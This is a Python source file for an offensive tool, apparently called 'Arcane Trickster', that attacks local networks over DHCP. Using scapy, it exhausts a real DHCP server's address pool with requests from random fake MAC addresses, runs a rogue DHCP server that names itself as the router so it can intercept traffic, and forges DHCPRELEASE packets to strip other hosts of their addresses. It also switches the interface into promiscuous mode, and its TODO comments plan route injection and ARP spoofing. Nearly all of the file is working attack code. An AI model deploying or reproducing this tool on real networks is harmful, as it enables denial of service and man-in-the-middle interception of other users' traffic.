from scapy.all import *
from threading import Thread, Event
from queue import Queue, Empty
from ipaddress import IPv4Network, IPv4Address
import random
import time
import select
import socket
import fcntl
import argparse
arg_parser = argparse.ArgumentParser(
                    prog='Arcane Trickster',
                    description="""Rogue DHCP Server: DHCP Starvation, DHCP Hijacking,
                    Ma\'am-in-the Middle DHCP Subleasing(LANlady)'""",
                    epilog='Text at the bottom of help')
import logging
logging.basicConfig(format='%(asctime)s - %(name)s [%(levelname)s] %(message)s', level=logging.INFO)

# https://stackoverflow.com/questions/6067405/python-sockets-enabling-promiscuous-mode-in-linux
import ctypes

class ifreq(ctypes.Structure):
    _fields_ = [("ifr_ifrn", ctypes.c_char * 16),
                ("ifr_flags", ctypes.c_short)]


def random_mac():
    mac = random.randint(0, 2**48-1)

    # Set the broadcast bit
    if not mac & 2**40:
        mac ^= 2**40

    mac = hex(mac)[2:].zfill(12)
    return f'{mac[:2]}:{mac[2:4]}:{mac[4:6]}:{mac[6:8]}:{mac[8:10]}:{mac[10:12]}'


def binary_search_list(in_list: list, value: object, key: 'FunctionType'=lambda item: item, fuzzy: bool=False) -> int:
    """
    Performs binary search for `value` on a sorted `in_list` with key selector `key`.

    Parameters:
        in_list (list): Sorted list to search.
        value (object): Value to search for.
        key     (func): Function that takes in an item and returns the key to search over.

    Returns:
        int: Index of value.
    """
    start_range = 0
    end_range   = len(in_list)

    if not end_range or value > key(in_list[-1]):
        if fuzzy:
            return end_range
        else:
            raise IndexError("Item not in list")


    if value < key(in_list[0]):
        if fuzzy:
            return start_range
        else:
            raise IndexError("Item not in list")

    curr     = -1
    fuzz_mod = 0
    while end_range - 1 != start_range:
        curr = (end_range - start_range) // 2 + start_range
        item = key(in_list[curr])

        if item == value:
            return curr
        elif item < value:
            start_range = curr
            fuzz_mod    = 1
        else:
            end_range = curr
            fuzz_mod  = 0

    # Special case since at zero, end_range - 1 == start_range
    if key(in_list[0]) == value:
        return 0

    if fuzzy:
        return curr + fuzz_mod
    else:
        raise IndexError("Item not in list")


class ThreadedWorker(object):
    def __init__(self) -> None:
        self.event       = Event()
        self.thread      = Thread(target=self._run, daemon=True)
        self.thread.start()

    def __del__(self):
        '''Function used by python internals when object is deleted.'''
        self.close()


    def close(self):
        self.event.set()


    def _run(self):
        raise NotImplementedError


class NetworkInterface(ThreadedWorker):
    '''This class creates a virtual network interface and a non-binding socket. 
        It uses a subscriber model to enable multi-threading.
    '''
    def __init__(self, name: str) -> None:
        self.name   = name
        # Create Socket and bind it
        self.socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        self.socket.bind((self.name, 0x0800))
        # Set socket to non-binding to allow for multi-threading without lockup
        self.socket.setblocking(0)
        self.enter_promiscious_mode()

        # Create subscriber model and then start thread in daemon mode
        self.subscribers = []
        super().__init__()


    def enter_promiscious_mode(self):
        IFF_PROMISC  = 0x100
        SIOCGIFFLAGS = 0x8913
        SIOCSIFFLAGS = 0x8914

        ifr = ifreq()
        ifr.ifr_ifrn = self.name.encode('utf-8')
        fcntl.ioctl(self.socket.fileno(), SIOCGIFFLAGS, ifr)
        ifr.ifr_flags |= IFF_PROMISC
        fcntl.ioctl(self.socket.fileno(), SIOCSIFFLAGS, ifr)


    @property
    def mac_address(self):
        '''
        Returns the scapy MAC address.
        '''
        return get_if_hwaddr(self.name)

    @property
    def ip_address(self):
        '''
        Return the scapy IP address 
        '''
        return get_if_addr(self.name)


    @property
    def subnet_mask(self):
        for net, msk, gw, iface, addr, metric in conf.route.routes:
            if iface == self.name:
                network = IPv4Network(f"{ltoa(net)}/{ltoa(msk)}")
                if IPv4Address(self.ip_address) in network:
                    return ltoa(msk)


    def close(self):
        ''' Sets Event flag to break while loop in _run() function. 
            Closes the socket and has the thread for the 
            network interface rejoin main python thread.
        '''
        self.event.set()
        self.socket.close()
        self.thread.join()


    def send(self, data: bytes):
        '''Sends data in bytes over the socket.'''
        self.socket.send(bytes(data))


    def subscribe(self, callback: "Function"):
        '''Adds a subscriber and passes the callback function in it's creation.'''
        if type(callback) is not Subscriber:
            callback = Subscriber(callback)
        self.subscribers.append(callback)


    def _run(self):
        while not self.event.is_set():
            r, _w, _err = select.select([self.socket], [], [], 1e-5)

            if self.socket in r:
                data = self.socket.recv(4 * 1024)

                for sub in self.subscribers:
                    sub(Ether(data))



class Subscriber(ThreadedWorker):
    def __init__(self, callback: "Function") -> None:
        self.callback = callback
        self.queue    = Queue()
        super().__init__()


    def __call__(self, *args, **kwds):
        self.queue.put((args, kwds))


    def _run(self):
        while not self.event.is_set():
            try:
                args, kwds = self.queue.get(timeout=1e-4)
                self.callback(*args, **kwds)
            except Empty:
                pass


class DHCPLeaseGenerator(object):
    def __init__(self) -> None:
        self.claimed    = {}
        self.mac_ip_map = {}


    def renew(self, ip_address: str):
        if ip_address in self.claimed:
            old_lease, expiration, mac_address = self.claimed[ip_address]

            # Make sure that they actually have the IP
            if ip_address == self.mac_ip_map.get(mac_address, "DNE"):
                if time.time() > expiration:
                    for lease in reversed(self.leases):
                        if hash(lease) == hash(old_lease):
                            logging.debug(f"Renewing lease {repr(lease)}")
                            old_lease.renew(lease)
                            return lease
                else:
                    return old_lease

        raise DHCPLeaseExpiredException(ip_address)


    def claim(self, mac_address: str):
        for lease in reversed(self.leases):
            # Release it first if it expired
            if lease.ip_address in self.claimed:
                old_lease, expiration, mac_address = self.claimed[lease.ip_address]

                if time.time() > expiration:
                    self.release(old_lease.ip_address)
                else:
                    continue


            if lease.is_expired:
                raise DHCPLeasePoolExhaustedException("Expired lease in renewal list")

            # Handle claims
            self.claimed[lease.ip_address] = (lease, lease.expiration, mac_address)
            self.mac_ip_map[mac_address]   = lease.ip_address
            logging.debug(f"Claiming lease {repr(lease)}")
            return lease

        raise DHCPLeasePoolExhaustedException


    def release(self, ip_address: str=None):
        logging.debug(f"Releasing lease {repr(ip_address)}")
        del self.claimed[ip_address]


class DHCPLease(object):
    def __init__(self, mac_address: str, ip_address: str, server_mac: str, server_ip: str, options: list, duration: int) -> None:
        self.mac_address = mac_address
        self.ip_address  = ip_address
        self.server_mac  = server_mac
        self.server_ip   = server_ip
        self.options     = options
        self.duration    = duration
        self.start_time  = time.time()


    def __repr__(self):
        return f"<DHCPLease mac_address={self.mac_address}, ip_address={self.ip_address}, server_mac={self.server_mac}, server_ip={self.server_ip}, options={self.options}, expiration={self.expiration}>"


    def __eq__(self, other):
        return (self.mac_address, self.ip_address, self.server_mac, self.server_ip) == (other.mac_address, other.ip_address, other.server_mac, other.server_ip)        

    def __hash__(self):
        return hash((self.mac_address, self.ip_address, self.server_mac, self.server_ip))


    @property
    def expiration(self):
        return self.start_time + self.duration

    @property
    def is_expired(self):
        return self.expiration < time.time()

    def renew(self, lease: 'DHCPLease'):
        self.start_time = lease.start_time
        self.duration   = lease.duration
        self.options    = lease.options


    def build_packet_base(self, op, xid: int=None, siaddr: int=None, ciaddr: int=None, secs: int=0, dst_mac: str=None, dst_ip: str=None, yiaddr: str=None, chaddr: str=None):
        if op == 1:
            sport, dport = 68, 67
        else:
            sport, dport = 67, 68

        mac_bytes = int.to_bytes(int((chaddr or self.mac_address).replace(":", ""), 16), 6, 'big')
        packet    = Ether(dst=dst_mac or self.server_mac, src=self.mac_address, type=0x0800) \
            / IP(src=self.ip_address, dst=dst_ip or self.server_ip) \
            / UDP(dport=dport, sport=sport) \
            / BOOTP(op=op, secs=secs, chaddr=mac_bytes, xid=xid or random.randint(0, 2**32-1), 
                    siaddr=siaddr or '0.0.0.0', ciaddr=ciaddr or '0.0.0.0', yiaddr=yiaddr or '0.0.0.0',
                    flags="B")

        return packet 


    def build_discover_packet(self, xid=None):
        return self.build_packet_base(1, xid) / DHCP(options=[("message-type", "discover"), ("requested_addr", self.ip_address), ("end")])


    def build_request_packet(self, xid):
        return self.build_packet_base(1, xid) / DHCP(options=[("message-type", "request"), ("requested_addr", self.ip_address), ("server_id", self.server_ip), ("end")])


    def build_renewal_packet(self, xid=None):
        return self.build_packet_base(1, xid, ciaddr=self.ip_address, secs=1) / DHCP(options=[("message-type", "request"), ("end")])


    def build_ack_packet(self, xid, dst_mac, dst_ip, siaddr, yiaddr, ciaddr='0.0.0.0'):
        options = [opt for opt in self.options if opt[0] not in ("server_id",)]
        return self.build_packet_base(2, xid, dst_mac=dst_mac, dst_ip=dst_ip, siaddr=siaddr, chaddr=dst_mac, yiaddr=yiaddr, ciaddr=ciaddr) / DHCP(options=[("message-type", "ack"), ("server_id", siaddr), *options, ("end")])


    def build_nak_packet(self, xid, dst_mac, dst_ip):
        return self.build_packet_base(2, xid, dst_mac=dst_mac, dst_ip=dst_ip, chaddr=dst_mac) / DHCP(options=[("message-type", "nak"), ("end")])


    def build_offer_packet(self, xid, dst_mac, dst_ip, siaddr, yiaddr):
        options = [opt for opt in self.options if opt[0] not in ("server_id",)]
        return self.build_packet_base(2, xid, dst_mac=dst_mac, dst_ip=dst_ip, siaddr=siaddr, yiaddr=yiaddr, chaddr=dst_mac) / DHCP(options=[("message-type", "offer"), ("server_id", siaddr), *options, ("end")])


    def build_release_packet(self):
        return self.build_packet_base(1) / DHCP(options=[("message-type", "release"), ("end")])



class DHCPLeaseCollector(ThreadedWorker):
    def __init__(self, interface: NetworkInterface, lease_callback: 'Function') -> None:
        self.interface        = interface
        self.lease_callback   = lease_callback
        self.server_ip        = None
        self.server_mac       = None
        self.recent           = set()
        self.virtual_clients  = {}
        self.xid_map          = {}
        self.offer_subscriber = self.interface.subscribe(self.handle_offer_callback)
        super().__init__()


    def handle_external_xid(self, xid, mac, lease):
        self.xid_map[xid] = mac


    def handle_offer_callback(self, data):
        if DHCP in data and data[BOOTP].xid in self.xid_map:
            logging.debug(f"Creating lease: MAC {data.dst} IP {data[BOOTP].yiaddr} Options {data[DHCP].options}")

            # Grab server info on first packet
            if not self.server_ip:
                self.server_ip  = data[IP].src
                self.server_mac = data.src


            mac = self.xid_map[data[BOOTP].xid]
            del self.xid_map[data[BOOTP].xid]

            lease = DHCPLease(
                mac,
                data[BOOTP].yiaddr,
                data.src,
                data[BOOTP].siaddr,
                [(k,v) for k,v in data[DHCP].options[:-1] if k != "message-type"],
                dict(data[DHCP].options[:-1])['lease_time']
            )

            self.virtual_clients[mac] = lease

            self.lease_callback(lease)
            self.interface.send(lease.build_request_packet(data[BOOTP].xid))


    def _run(self):
        while not self.event.is_set():
            time.sleep(0.5)

            xid   = random.randint(0, 2**32-1)
            lease = None
            if len(self.virtual_clients) < 2**8:
                mac = random_mac()
                self.virtual_clients[mac] = None
            else:
                # Look for virtual clients with expired leases
                found = False
                for mac, lease in self.virtual_clients.items():
                    if not lease or lease.is_expired:
                        found = True
                        break

                if not found:
                    continue


            # Let the lease ask for the same IP if possible
            if lease:
                packet = lease.build_discover_packet(xid=xid)
            else:
                mac_bytes = int.to_bytes(int(mac.replace(":", ""), 16), 6, 'big')
                packet    = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac, type=0x0800) \
                    / IP(src="0.0.0.0", dst="255.255.255.255") \
                    / UDP(dport=67, sport=68) \
                    / BOOTP(op=1, chaddr=mac_bytes, xid=xid) \
                    / DHCP(options=[("message-type", "discover"), ("end")])

            self.xid_map[xid] = mac
            self.interface.send(packet)



class DHCPLeaseRenewer(ThreadedWorker):
    def __init__(self, interface: NetworkInterface, xid_callback: "Function") -> None:
        self.interface = interface
        self.leases    = []
        self.pending   = {}
        self.queue     = Queue()
        self.xid_callback = xid_callback
        super().__init__()


    def lease_callback(self, lease: DHCPLease):
        self.queue.put(lease)


    def handle_new_leases(self):
        while self.queue.not_empty:
            # This literally happened. Don't delete
            try:
                lease = self.queue.get_nowait()
            except Empty:
                break

            # Handle lease renewal
            if lease in self.pending:
                self.pending[lease].renew(lease)
                del self.pending[lease]
            else:
                self.leases.append(lease)

            self.leases = sorted(self.leases, key=lambda lease: lease.expiration)


    def renew_leases(self):
        # Renew leases about to be expired
        renewal_boundary = binary_search_list(self.leases, time.time() + 30, key=lambda lease: lease.expiration, fuzzy=True)
        expired_leases   = []

        for lease in self.leases[:renewal_boundary]:
            xid = random.randint(0, 2**32-1)
            if lease.is_expired:
                expired_leases.append(lease)
                self.xid_callback(xid, lease.mac_address, lease)
                self.interface.send(lease.build_discover_packet(xid))
            else:
                # Don't try to renew if it's already pending
                if lease not in self.pending:
                    logging.debug(f"Renewing lease {repr(lease)}")

                    self.pending[lease] = lease
                    self.xid_callback(xid, lease.mac_address, lease)
                    self.interface.send(lease.build_renewal_packet(xid))

        # Prune expired leases
        for lease in expired_leases:
            idx = binary_search_list(self.leases, lease.expiration, key=lambda lease: lease.expiration)
            del self.leases[idx]

            logging.debug(f"Deleting expired lease {repr(lease)}")


    def _run(self):
        while not self.event.is_set():
            time.sleep(5)
            self.handle_new_leases()
            self.renew_leases()


class DHCPLeasePoolExhaustedException(Exception):
    pass

class DHCPLeaseExpiredException(Exception):
    pass


class DHCPRangeLeaser(DHCPLeaseGenerator):
    def __init__(self, interface: NetworkInterface, ip_address_start: IPv4Address, ip_address_stop: IPv4Address, **options) -> None:
        self.interface        = interface
        self.ip_address_start = ip_address_start
        self.ip_address_stop  = ip_address_stop
        self.options          = options
        self.options.update({
            'router': options.get('router', interface.ip_address),
            'subnet_mask': options.get('subnet_mask', interface.subnet_mask),
            'lease_time': options.get('lease_time', 60)
        })
        super().__init__()

        lease_range = range(int.from_bytes(self.ip_address_start.packed, 'big'), int.from_bytes(self.ip_address_stop.packed, 'big')+1)

        self._leases = [DHCPLease(random_mac(), str(IPv4Address(ip_int)), interface.mac_address, interface.ip_address, list(self.options.items()), self.options['lease_time']) for ip_int in lease_range]


    @property
    def leases(self):
        if (self._leases[0].expiration - (self.options['lease_time'] // 2)) < time.time():
            for lease in self._leases:
                lease.start_time = time.time()
        
        return self._leases


class DHCPSubleaser(DHCPLeaseGenerator):
    def __init__(self, interface: NetworkInterface) -> None:
        self.renewer   = DHCPLeaseRenewer(interface, lambda _x,_m,_l: None)
        self.collector = DHCPLeaseCollector(interface, self.renewer.lease_callback)
        self.renewer.xid_callback = self.collector.handle_external_xid
        #self.stealer   = interface.subscribe(self.steal)
        self.interface = interface
        self.claimed   = {}


    @property
    def leases(self):
        return self.renewer.leases


    def steal(self, packet):
        # Someone's using an IP we didn't assign. Get 'em bois
        if IP in packet and packet[IP].src != self.collector.server_ip and not packet[IP].src in self.claimed:
            lease = DHCPLease(
                mac_address=packet.src,
                ip_address=packet[IP].src,
                server_mac=self.collector.server_mac,
                server_ip=self.collector.server_ip,
                options=[],
                duration=60
            )

            logging.debug(f"Stealing lease {repr(lease)}")

            self.interface.send(lease.build_release_packet())




class DHCPLeaseStealer(object):
    def __init__(self, interface: NetworkInterface) -> None:
        self.interface = interface



class DHCPServer(object):
    def __init__(self, interface: NetworkInterface, lease_generator: DHCPLeaseGenerator) -> None:
        self.lease_generator = lease_generator
        self.interface       = interface
        self.interface.subscribe(self.handle_packet)


    def __repr__(self):
        return f"<DHCPServer: interface={self.interface.name}, num_leases={self.num_leases}, num_claimed={len(self.lease_generator.claimed)}>"


    @property
    def num_leases(self):
        return len(self.lease_generator.leases)


    def handle_packet(self, packet):
        if DHCP in packet:
            if not ("message-type", 2) in packet[DHCP].options and not ("message-type", 5) in packet[DHCP].options:
                print(packet[DHCP].options)
            self.handle_dhcp_discover(packet)
            self.handle_dhcp_request(packet)


    def handle_dhcp_discover(self, packet):
        if ("message-type", 1) in packet[DHCP].options:
            logging.info(f"Handling DHCPDISCOVER for {packet.src}")

            packet.show()

            if packet[IP].src == "0.0.0.0":
                dst_ip = "255.255.255.255"
                ip     = self.lease_generator.mac_ip_map.get(packet.src, "DNE")
            else:
                dst_ip = packet[IP].src
                ip     = dst_ip


            # Give them their current IP if we have it
            if ip in self.lease_generator.claimed:
                lease = self.lease_generator.renew(ip)
            else:
                lease = self.lease_generator.claim(packet.src)


            logging.info(f"Offering {lease.ip_address} to {packet.src}")

            self.interface.send(lease.build_offer_packet(xid=packet[BOOTP].xid, dst_ip=dst_ip, dst_mac=packet.src, siaddr=self.interface.ip_address, yiaddr=lease.ip_address))


    def handle_dhcp_request(self, packet):
        if ("message-type", 3) in packet[DHCP].options:
            logging.info(f"Handling DHCPREQUEST for {packet.src}")

            packet.show()

            if packet[IP].src == "0.0.0.0":
                if packet[BOOTP].ciaddr == '0.0.0.0':
                    lease_ip = [opt for opt in packet[DHCP].options if opt[0] == "requested_addr"][0][1]
                else:
                    lease_ip = packet[BOOTP].ciaddr
            else:
                lease_ip = packet[IP].src

            try:
                lease = self.lease_generator.renew(lease_ip)
                logging.info(f"Sending lease for {lease.ip_address} to {packet.src}")
                ack = lease.build_ack_packet(xid=packet[BOOTP].xid, dst_ip=packet[IP].src, dst_mac=packet.src, siaddr=self.interface.ip_address, yiaddr=lease.ip_address, ciaddr=packet[BOOTP].ciaddr)
                ack.show()
                self.interface.send(ack)
            except DHCPLeaseExpiredException:
                logging.info(f"Sending DHCPNAK to {packet.src}")
                nak = self.lease_generator.leases[0].build_nak_packet(xid=packet[BOOTP].xid, dst_ip=packet[IP].src, dst_mac=packet.src)
                nak.show()
                self.interface.send(nak)


net_if = NetworkInterface("enp0s3")
#server = DHCPServer(net_if, DHCPSubleaser(net_if))
server = DHCPServer(net_if, DHCPRangeLeaser(net_if, IPv4Address("10.10.10.10"), IPv4Address("10.10.10.239")))



def arp_scan(network: IPv4Network):
    # https://www.geeksforgeeks.org/network-scanning-using-scapy-module-python/
    request = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=str(network))
    clients = scapy.srp(request, timeout = 1)[0]
    return [(c[1].psrc, c[1].hwsrc) for c in clients]



# TODO Add functionality to intercept a DHCPOFFER and inject our own routes.
# TODO Add functionlity to check if a DHCPREQUEST is unicast
# TODO Add NetworkAddressTranslation functionality, we hoard leases then hand them out

# TODO DHCPServer Class
# TODO DHCPLeaseGenerator Class
# TODO Router Class (NAT)
    # The Real Router
    # Subscriber to listen for relevant packets to the virtual Router
# TODO ARP Spoof

# TODO (not priority) Storage
            # Export PCAP
